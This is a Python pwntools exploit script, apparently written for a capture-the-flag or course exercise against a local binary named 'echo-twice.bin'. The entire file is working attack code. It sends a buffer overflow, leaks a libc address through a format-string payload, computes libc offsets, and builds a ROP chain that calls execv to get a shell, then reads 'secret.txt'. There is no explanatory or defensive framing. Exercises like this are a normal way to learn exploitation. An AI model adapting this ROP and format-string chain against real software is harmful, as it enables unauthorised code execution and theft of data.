#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./echo-twice.bin")
    #input("pause")
    
    rop = ROP("./echo-twice.bin")
    #print(rop.rdi, rop.rsi)
    rdi_gadget = p64(0x400923)
    rsi_gadget = p64(0x400921)

    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    read_offset = libc.symbols['read']
    execv_offset = libc.symbols['execv']

    p.recvline()
    p.sendline(b"a")
    p.recvline()
    p.recvline()
    # 0x601020 : GOT entry of write() system call
    # 0x400796 : An address of safe_echo() function
    # 0x40083b : An address of unsafe_echo() function
    p.sendline(b"a"*0x18 + p64(0x601020) + b"a"*0x8 + p64(0x400796) + p64(0x40083b))
    p.recvline()
    p.recvline()
    p.sendline(b"%p%p%p%p%p%p%p%p%p%p%p%s")
    #input("pause")
    p.recvuntil(b"0x616161616161000a")
    write_addr_temp = p.recvline()
    write_addr_temp = write_addr_temp.rstrip(b'\n')
    write_int_addr = int.from_bytes(write_addr_temp, 'little')
    base_int_addr = write_int_addr - write_offset
    read_int_addr = base_int_addr + read_offset
    read_byte_addr = read_int_addr.to_bytes(8, byteorder='little')
    execv_int_addr = base_int_addr + execv_offset
    execv_byte_addr = execv_int_addr.to_bytes(8, byteorder='little')
    sleep(0.1)

    p.recvline()
    p.sendline(b"\x00"*0x28 + rdi_gadget + p64(0x4009ae) + execv_byte_addr)
    p.recv(64)
    
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

    

if __name__ == "__main__":
    exploit()
